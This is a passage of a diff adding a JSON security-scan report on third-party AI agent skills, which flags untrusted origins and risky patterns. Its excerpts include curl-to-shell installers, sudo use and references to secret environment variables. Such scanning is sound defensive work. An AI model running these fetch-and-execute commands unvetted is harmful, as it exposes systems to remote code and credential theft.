+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.388Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "template-skill": {
+      "ref": "composiohq/awesome-claude-skills@template-skill",
+      "skillKey": "template-skill",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.388Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "twitter-algorithm-optimizer": {
+      "ref": "composiohq/awesome-claude-skills@twitter-algorithm-optimizer",
+      "skillKey": "twitter-algorithm-optimizer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.389Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-code-javascript": {
+      "ref": "czlonkowski/n8n-skills@n8n-code-javascript",
+      "skillKey": "n8n-code-javascript",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.285Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-code-python": {
+      "ref": "czlonkowski/n8n-skills@n8n-code-python",
+      "skillKey": "n8n-code-python",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.289Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-expression-syntax": {
+      "ref": "czlonkowski/n8n-skills@n8n-expression-syntax",
+      "skillKey": "n8n-expression-syntax",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.290Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-mcp-tools-expert": {
+      "ref": "czlonkowski/n8n-skills@n8n-mcp-tools-expert",
+      "skillKey": "n8n-mcp-tools-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.293Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-node-configuration": {
+      "ref": "czlonkowski/n8n-skills@n8n-node-configuration",
+      "skillKey": "n8n-node-configuration",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.295Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "n8n-validation-expert": {
+      "ref": "czlonkowski/n8n-skills@n8n-validation-expert",
+      "skillKey": "n8n-validation-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:52.297Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/czlonkowski/n8n-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "animation-designer": {
+      "ref": "daffy0208/ai-dev-standards@animation-designer",
+      "skillKey": "animation-designer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:54.052Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/daffy0208/ai-dev-standards is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "grammar-checker": {
+      "ref": "daleseo/korean-skills@grammar-checker",
+      "skillKey": "grammar-checker",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:54.432Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/daleseo/korean-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "app-store-changelog": {
+      "ref": "dimillian/skills@app-store-changelog",
+      "skillKey": "app-store-changelog",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:00.885Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/dimillian/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "macos-spm-app-packaging": {
+      "ref": "dimillian/skills@macos-spm-app-packaging",
+      "skillKey": "macos-spm-app-packaging",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:00.886Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/dimillian/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "r3f-best-practices": {
+      "ref": "emalorenzo/three-agent-skills@r3f-best-practices",
+      "skillKey": "r3f-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:01.237Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/emalorenzo/three-agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "three-best-practices": {
+      "ref": "emalorenzo/three-agent-skills@three-best-practices",
+      "skillKey": "three-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:01.241Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "rules/gltf-loading-optimization.md",
+          "excerpt": "LI ### Installation ```bash npm install -g @gltf-transform/cli ``` ###"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/emalorenzo/three-agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "r3f-fundamentals": {
+      "ref": "enzed/r3f-skills@r3f-fundamentals",
+      "skillKey": "r3f-fundamentals",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:01.592Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/enzed/r3f-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "ralph-wiggum": {
+      "ref": "fstandhartinger/ralph-wiggum@ralph-wiggum",
+      "skillKey": "ralph-wiggum",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:08.453Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/fstandhartinger/ralph-wiggum is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "skill-from-masters": {
+      "ref": "gbsoss/skill-from-masters@skill-from-masters",
+      "skillKey": "skill-from-masters",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:08.765Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/gbsoss/skill-from-masters is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "refactor": {
+      "ref": "github/awesome-copilot@refactor",
+      "skillKey": "refactor",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:13.053Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/github/awesome-copilot is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "web-design-reviewer": {
+      "ref": "github/awesome-copilot@web-design-reviewer",
+      "skillKey": "web-design-reviewer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:13.054Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/github/awesome-copilot is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "prisma-orm-v7-skills": {
+      "ref": "gocallum/nextjs16-agent-skills@prisma-orm-v7-skills",
+      "skillKey": "prisma-orm-v7-skills",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:13.580Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/gocallum/nextjs16-agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "heroui-react": {
+      "ref": "heroui-inc/heroui@heroui-react",
+      "skillKey": "heroui-react",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:17.393Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "SKILL.md",
+          "excerpt": "--- ## Installation ```bash curl -fsSL https://heroui.com/install | bash -s heroui-react ``` --- ##"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/heroui-inc/heroui is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "markdown-converter": {
+      "ref": "intellectronica/agent-skills@markdown-converter",
+      "skillKey": "markdown-converter",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:18.789Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/intellectronica/agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "nano-banana-pro": {
+      "ref": "intellectronica/agent-skills@nano-banana-pro",
+      "skillKey": "nano-banana-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:18.790Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/intellectronica/agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "youtube-transcript": {
+      "ref": "intellectronica/agent-skills@youtube-transcript",
+      "skillKey": "youtube-transcript",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:18.790Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/intellectronica/agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "swiftui-animation": {
+      "ref": "jamesrochabrun/skills@swiftui-animation",
+      "skillKey": "swiftui-animation",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:19.285Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jamesrochabrun/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "angular-architect": {
+      "ref": "jeffallan/claude-skills@angular-architect",
+      "skillKey": "angular-architect",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.320Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "api-designer": {
+      "ref": "jeffallan/claude-skills@api-designer",
+      "skillKey": "api-designer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.321Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "architecture-designer": {
+      "ref": "jeffallan/claude-skills@architecture-designer",
+      "skillKey": "architecture-designer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.322Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "cli-developer": {
+      "ref": "jeffallan/claude-skills@cli-developer",
+      "skillKey": "cli-developer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.324Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "references/design-patterns.md",
+          "excerpt": "ion}`); console.log(`Run: npm install -g mycli@latest`); } }).catch("
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/go-cli.md",
+          "excerpt": "(os.Stderr, \"Try running with sudo or check file permissions\")"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/node-cli.md",
+          "excerpt": "nsole.error('Try running with sudo or check file permissions');"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/python-cli.md",
+          "excerpt": "typer.echo(\"Try running with sudo or check file permissions\")"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/ux-patterns.md",
+          "excerpt": "rmissions. Try: • Run with sudo: sudo mycli config set key va"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/ux-patterns.md",
+          "excerpt": "ons. Try: • Run with sudo: sudo mycli config set key value"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "cloud-architect": {
+      "ref": "jeffallan/claude-skills@cloud-architect",
+      "skillKey": "cloud-architect",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.326Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "code-documenter": {
+      "ref": "jeffallan/claude-skills@code-documenter",
+      "skillKey": "code-documenter",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.328Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/coverage-reports.md",
+          "excerpt": "sdoc\"] # Python - pydocstyle pip install pydocstyle pydocstyle --conve"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/coverage-reports.md",
+          "excerpt": "thon - interrogate (coverage) pip install interrogate interrogate -v sr"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/documentation-systems.md",
+          "excerpt": "```bash # linkcheck (Python) pip install linkchecker linkchecker http:"
+        },
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "references/documentation-systems.md",
+          "excerpt": "# broken-link-checker (Node) npm install -g broken-link-checker blc http:"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "code-reviewer": {
+      "ref": "jeffallan/claude-skills@code-reviewer",
+      "skillKey": "code-reviewer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.329Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "csharp-developer": {
+      "ref": "jeffallan/claude-skills@csharp-developer",
+      "skillKey": "csharp-developer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.330Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "database-optimizer": {
+      "ref": "jeffallan/claude-skills@database-optimizer",
+      "skillKey": "database-optimizer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.332Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "debugging-wizard": {
+      "ref": "jeffallan/claude-skills@debugging-wizard",
+      "skillKey": "debugging-wizard",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.333Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "devops-engineer": {
+      "ref": "jeffallan/claude-skills@devops-engineer",
+      "skillKey": "devops-engineer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.334Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "p COPY requirements.txt . RUN pip install --no-cache-dir -r requirement"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/docker-patterns.md",
+          "excerpt": "m AS builder WORKDIR /app RUN pip install --no-cache-dir poetry COPY py"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/docker-patterns.md",
+          "excerpt": "m=builder /wheels /wheels RUN pip install --no-cache-dir /wheels/* COPY"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/github-actions.md",
+          "excerpt": "password: ${{ secrets.GITHUB_TOKEN }} - id: meta u"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "dotnet-core-expert": {
+      "ref": "jeffallan/claude-skills@dotnet-core-expert",
+      "skillKey": "dotnet-core-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.337Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "embedded-systems": {
+      "ref": "jeffallan/claude-skills@embedded-systems",
+      "skillKey": "embedded-systems",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.338Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "fastapi-expert": {
+      "ref": "jeffallan/claude-skills@fastapi-expert",
+      "skillKey": "fastapi-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.341Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "fullstack-guardian": {
+      "ref": "jeffallan/claude-skills@fullstack-guardian",
+      "skillKey": "fullstack-guardian",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.343Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "game-developer": {
+      "ref": "jeffallan/claude-skills@game-developer",
+      "skillKey": "game-developer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.345Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "javascript-pro": {
+      "ref": "jeffallan/claude-skills@javascript-pro",
+      "skillKey": "javascript-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.346Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "kotlin-specialist": {
+      "ref": "jeffallan/claude-skills@kotlin-specialist",
+      "skillKey": "kotlin-specialist",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.348Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/multiplatform-kmp.md",
+          "excerpt": "password = System.getenv(\"GITHUB_TOKEN\") } }"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "kubernetes-specialist": {
+      "ref": "jeffallan/claude-skills@kubernetes-specialist",
+      "skillKey": "kubernetes-specialist",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.351Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/helm-charts.md",
+          "excerpt": "CR_TOKEN: \"${{ secrets.GITHUB_TOKEN }}\" ``` ### OCI Registry ``"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/multi-cluster.md",
+          "excerpt": "ion ```bash # Install subctl curl -Ls https://get.submariner.io | bash # Join clusters to broker su"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/multi-cluster.md",
+          "excerpt": "terctl chmod +x clusterctl && sudo mv clusterctl /usr/local/bin/"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/service-mesh.md",
+          "excerpt": "```bash # Install Istio CLI curl -L https://istio.io/downloadIstio | sh - export PATH=$PWD/istio-*/bi"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/service-mesh.md",
+          "excerpt": "```bash # Install Linkerd CLI curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh export PATH=$HOME/.linkerd2/b"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/workloads.md",
+          "excerpt": "ccess-key - name: AWS_SECRET_ACCESS_KEY valueFrom:"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "microservices-architect": {
+      "ref": "jeffallan/claude-skills@microservices-architect",
+      "skillKey": "microservices-architect",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.353Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "nextjs-developer": {
+      "ref": "jeffallan/claude-skills@nextjs-developer",
+      "skillKey": "nextjs-developer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.355Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "pandas-pro": {
+      "ref": "jeffallan/claude-skills@pandas-pro",
+      "skillKey": "pandas-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.356Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "playwright-expert": {
+      "ref": "jeffallan/claude-skills@playwright-expert",
+      "skillKey": "playwright-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.357Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "postgres-pro": {
+      "ref": "jeffallan/claude-skills@postgres-pro",
+      "skillKey": "postgres-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.359Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "apt_install",
+          "message": "Installs system packages via apt.",
+          "file": "references/replication.md",
+          "excerpt": "sh # Install pg_auto_failover apt-get install pg-auto-failover # Setup mon"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "react-expert": {
+      "ref": "jeffallan/claude-skills@react-expert",
+      "skillKey": "react-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.360Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "react-native-expert": {
+      "ref": "jeffallan/claude-skills@react-native-expert",
+      "skillKey": "react-native-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.361Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rust-engineer": {
+      "ref": "jeffallan/claude-skills@rust-engineer",
+      "skillKey": "rust-engineer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.362Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "secure-code-guardian": {
+      "ref": "jeffallan/claude-skills@secure-code-guardian",
+      "skillKey": "secure-code-guardian",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.364Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "security-reviewer": {
+      "ref": "jeffallan/claude-skills@security-reviewer",
+      "skillKey": "security-reviewer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.365Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "references/penetration-testing.md",
+          "excerpt": "/dev/null # Sudo permissions sudo -l # Writable paths in PATH"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/sast-tools.md",
+          "excerpt": "``bash # Bandit - Python SAST pip install bandit bandit -r . -f json -o"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/sast-tools.md",
+          "excerpt": "# Safety - Dependency check pip install safety safety check safety ch"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/sast-tools.md",
+          "excerpt": "ty-report.json # Pyup Safety pip install pyupio-safety pyupio-safety c"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/sast-tools.md",
+          "excerpt": "sh # Semgrep - Universal SAST pip install semgrep semgrep --config=auto"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/secret-scanning.md",
+          "excerpt": "gitleaks-action@v2 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/secret-scanning.md",
+          "excerpt": "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} # GitLab CI secret_detect"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "references/secret-scanning.md",
+          "excerpt": "TruffleHog ```bash # Install pip install trufflehog # Scan filesystem"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "shopify-expert": {
+      "ref": "jeffallan/claude-skills@shopify-expert",
+      "skillKey": "shopify-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.368Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "references/performance-optimization.md",
+          "excerpt": "me Web Store # Lighthouse CI npm install -g @lhci/cli lhci autorun --coll"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "spring-boot-engineer": {
